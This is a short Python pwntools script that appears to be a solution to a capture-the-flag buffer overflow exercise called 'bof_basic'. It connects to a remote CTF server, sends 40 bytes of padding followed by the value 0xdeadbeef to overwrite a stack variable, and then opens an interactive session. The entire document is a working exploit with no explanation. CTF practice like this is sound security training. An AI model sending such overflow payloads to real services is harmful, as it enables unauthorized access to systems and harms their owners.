from pwn import *
#p = process("./bof_basic")
host = "ctf.j0n9hyun.xyz"
port = 3000
  
p = remote(host,port)
payload = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU"
payload += p32(0xdeadbeef)
p.send(payload)
print p.recvrepeat(0.4)
p.interactive()
